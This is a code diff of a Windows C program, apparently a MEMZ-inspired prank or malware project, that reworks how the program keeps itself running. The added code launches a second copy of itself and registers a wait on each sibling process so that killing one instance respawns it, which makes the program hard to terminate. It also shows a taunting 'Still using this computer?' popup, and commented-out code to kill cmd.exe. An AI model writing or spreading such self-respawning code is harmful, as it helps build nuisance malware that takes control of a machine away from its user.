@@ -2,32 +2,49 @@
 
 #define ARG L"monitorproc"
 
-DWORD WINAPI monitorT(LPVOID p);
+void monitor();
+
+VOID CALLBACK WaitOrTimerCallback(
+	_In_  PVOID lpParameter,
+	_In_  BOOLEAN TimerOrWaitFired
+)
+{
+	LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
+	GetModuleFileName(NULL, procn, MAX_PATH * 2);
+	ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
+	LocalFree(procn);
+
+	monitor();
+}
+
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 
 	int argc;
 	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
-	
-	if (argc > 1 && !lstrcmpW(argv[1], ARG)) {
+	if (argc == 1 || lstrcmpW(argv[1], ARG)) {
 
-		CreateThread(NULL, NULL, &monitorT, NULL, 0, NULL);
-	}
-	else {
 		
-		CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
+		//CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
 
 		LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
 		GetModuleFileName(NULL, procn, MAX_PATH * 2);
 
-		for (UINT8 i = 0; i < 3; i++) {
-			ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
-		}
+		ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
 		
+		Sleep(100000);
 		popup("lol", "Still using this computer?\n");
+		
 	}
-	
+	else {
+
+		//argv[0] = (LPWSTR)L"Blabla";
+
+	}
+
+	monitor();
+
 	//while (popup("lol", "Still using this computer?\n") == IDYES) {}
 	//HANDLE lightsT = CreateThread(NULL, NULL, &FlashLEDs, NULL, 0, NULL);
 	
@@ -45,11 +62,10 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	return 0;
 }
 
-DWORD WINAPI monitorT(LPVOID p) {
+void monitor() {
 
-	size_t prevProcAmount = 0;
-	size_t procAmount = 0;
-	
+	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	// Get all current running processes
+
 	LPWSTR iprocn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 512);			// Get the current process's name
 	GetProcessImageFileNameW(GetCurrentProcess(), iprocn, 512);
 	iprocn = getImagNameW(iprocn);
@@ -57,47 +73,23 @@ DWORD WINAPI monitorT(LPVOID p) {
 	HANDLE cproc;
 	char* cprocn = NULL;
 
-	Sleep(1000);
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(entry);
 
-	/* "Inspired" by MEMZ, a way to monitor all running processes under the same name */
-	while (true) {
+	Process32First(snap, &entry);
 
-		HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	// Get all current running processes
+	HANDLE nh;
 
-		PROCESSENTRY32 entry;
-		entry.dwSize = sizeof(entry);
+	do {
 
-		Process32First(snap, &entry);
- 
-		procAmount = 0;
-
-		do {
-
-			if (!lstrcmpW(L"cmd.exe", entry.szExeFile)) {
-				/*cproc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, entry.th32ProcessID);
-				TerminateProcess(cproc, 0);
-				CloseHandle(cproc);*/
-			}
-
-			if (!lstrcmpW(iprocn, entry.szExeFile)) {
-				procAmount++;
-			}
-
-		} while (Process32Next(snap, &entry));
-
-		CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
-
-		if (procAmount < prevProcAmount) {
-
-			LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
-			GetModuleFileName(NULL, procn, MAX_PATH * 2);
-			ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
-			LocalFree(procn);
-			return 1;
+		if (!lstrcmpW(iprocn, entry.szExeFile) && entry.th32ProcessID != GetCurrentProcessId()) {
+			cproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
+			RegisterWaitForSingleObject(&nh, cproc, WaitOrTimerCallback, NULL, INFINITE, WT_EXECUTEONLYONCE);
+			break;
 		}
 
-		prevProcAmount = procAmount;
+	} while (Process32Next(snap, &entry));
 
-		Sleep(500);
-	}
+
+	CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
 }
